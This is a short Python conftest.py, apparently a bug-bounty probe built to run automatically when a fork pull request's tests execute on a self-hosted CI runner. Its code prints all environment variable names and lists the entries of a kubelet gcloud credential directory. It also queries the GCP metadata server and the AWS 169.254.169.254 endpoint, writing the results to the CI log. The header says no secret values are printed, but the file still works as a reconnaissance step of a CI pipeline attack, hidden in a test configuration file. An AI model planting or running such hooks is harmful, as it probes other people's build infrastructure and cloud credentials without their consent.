# IBB security verification conftest.
# Purpose: confirm the execution context of fork-PR-triggered jobs on
# self-hosted runners. Prints environment variable NAMES only (no values),
# path-existence booleans, and metadata-service HTTP status codes.
# No secret values are printed and no data leaves the runner.
import os

print("BBP-CI-RECON-BEGIN", flush=True)
print("BBP-ENV-NAMES", ",".join(sorted(os.environ)), flush=True)
print("BBP-POD-UID-PRESENT", bool(os.environ.get("POD_UID")), flush=True)
p = os.environ.get("KUBELET_GCLOUD_CONFIG_PATH")
print("BBP-KUBELET-GCLOUD-PATH", p if p else "unset", flush=True)
if p:
    try:
        print("BBP-KUBELET-GCLOUD-EXISTS", os.path.exists(p), flush=True)
        print("BBP-KUBELET-GCLOUD-ENTRIES", ",".join(sorted(os.listdir(p))[:20]), flush=True)
    except Exception as e:
        print("BBP-KUBELET-GCLOUD-ERR", type(e).__name__, flush=True)
try:
    import urllib.request
    req = urllib.request.Request("http://metadata.google.internal/computeMetadata/v1/",
                                 headers={"Metadata-Flavor": "Google"})
    print("BBP-GCP-META-STATUS", urllib.request.urlopen(req, timeout=3).status, flush=True)
except Exception as e:
    print("BBP-GCP-META-ERR", type(e).__name__, flush=True)
try:
    import urllib.request
    print("BBP-AWS-META-STATUS", urllib.request.urlopen("http://169.254.169.254/latest/meta-data/", timeout=3).status, flush=True)
except Exception as e:
    print("BBP-AWS-META-ERR", type(e).__name__, flush=True)
print("BBP-CI-RECON-END", flush=True)
